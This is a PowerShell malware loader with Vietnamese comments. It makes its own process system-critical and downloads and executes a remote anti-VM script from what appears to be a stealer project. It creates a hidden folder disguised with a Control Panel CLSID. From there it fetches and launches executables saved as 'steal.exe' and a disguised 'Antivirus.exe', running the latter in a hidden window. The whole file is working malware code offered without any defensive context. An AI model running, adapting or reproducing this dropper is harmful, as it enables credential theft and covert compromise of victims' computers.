Add-Type @"
using System;
using System.Runtime.InteropServices;

public class CriticalProcessHelper {
    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern int RtlSetProcessIsCritical(uint isCritical, ref uint refValue, uint unknown);

    public static void SetProcessCritical() {
        uint isCritical = 1;  // Process is critical
        uint refValue = 0;    // Reserved, must be zero
        RtlSetProcessIsCritical(isCritical, ref refValue, 0);
    }

    public static void UnsetProcessCritical() {
        uint isCritical = 0;  // Process is no longer critical
        uint refValue = 0;    // Reserved, must be zero
        RtlSetProcessIsCritical(isCritical, ref refValue, 0);
    }
}
"@

# Đặt tiến trình hiện tại là Critical Process
[CriticalProcessHelper]::SetProcessCritical()

try {
    # Tải và chạy tập lệnh từ URL
    $url = "https://raw.githubusercontent.com/macedonianlegend/Kematian/main/frontend-src/antivm.ps1"
    $scriptContent = Invoke-WebRequest -Uri $url -UseBasicParsing | Select-Object -ExpandProperty Content
    Invoke-Expression $scriptContent
}
catch {
    Write-Host "Đã xảy ra lỗi khi chạy tập lệnh từ URL: $_"
}
finally {
    # Gỡ trạng thái Critical Process
    [CriticalProcessHelper]::UnsetProcessCritical()
    Write-Host "Đã tắt Critical Process"
}

$rdir = "$env:localappdata\Loader"
$dir = "$rdir.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
New-Item -ItemType Directory -Path $dir
attrib +h +s $dir

$url = "https://github.com/s1uiasdad/log-acc-v2/releases/download/AutoBuildExe/tootls.exe"
$output = "$dir\steal.exe"

if (Test-Path -Path $output) {
    Write-Host "hello"
} else {
    Invoke-WebRequest -Uri $url -OutFile $output
    Start-Process -FilePath $output
}

$url = "https://github.com/43a1723/test/raw/main/Extras/hacklife/Antivirus.exe"
$output = "$dir\loader.exe"

if (Test-Path -Path $output) {
    Write-Host "hello"
} else {
    Invoke-WebRequest -Uri $url -OutFile $output
    Start-Process -WindowStyle Hidden -FilePath $output
}
